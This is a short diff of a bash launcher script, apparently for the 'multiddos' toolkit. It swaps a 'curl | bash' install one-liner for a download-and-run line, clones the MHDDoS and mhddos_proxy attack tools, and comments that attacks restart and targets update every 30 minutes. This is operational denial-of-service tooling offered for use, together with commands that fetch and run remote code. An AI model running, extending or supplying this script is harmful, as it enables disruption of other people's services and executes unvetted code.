@@ -1,5 +1,5 @@
 #!/bin/bash
-# curl -L tiny.one/multiddos | bash && tmux a
+# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a
 
 clear && echo -e "Loading...\n"
 
@@ -198,6 +198,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
+pip uninstall uvloop
 
 # Restart attacks and update targets every 30 minutes
 while true; do
